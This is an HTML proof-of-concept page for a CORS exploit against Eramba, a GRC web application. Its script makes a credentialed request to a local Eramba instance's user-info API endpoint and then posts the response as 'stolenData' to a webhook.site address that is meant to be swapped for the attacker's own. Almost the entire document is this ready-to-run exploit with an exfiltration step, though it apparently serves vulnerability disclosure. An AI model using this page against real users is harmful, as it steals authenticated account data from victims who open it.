<!DOCTYPE html>
<html>
<head>
  <title>Eramba Local CORS PoC (XHR Style)</title>
</head>
<body>
  <h2>Eramba Local CORS Exploit Demo (XHR)</h2>
  <button onclick="exploit()">Exploit via XMLHttpRequest</button>

  <script>
    function exploit() {
      var req = new XMLHttpRequest();
      req.onload = function () {
        alert("Response from Eramba:\n\n" + this.responseText);

        // Optional: Exfiltrate to your own webhook
        var exfil = new XMLHttpRequest();
        exfil.open("POST", "https://webhook.site/your-id", true); // Replace with your webhook
        exfil.setRequestHeader("Content-Type", "application/json");
        exfil.send(JSON.stringify({ stolenData: this.responseText }));
      };

      // This is the correct endpoint and method
      req.open("GET", "https://localhost:8443/system-api/users/info", true);
      req.withCredentials = true;
      req.send();
    }
  </script>
</body>
</html>
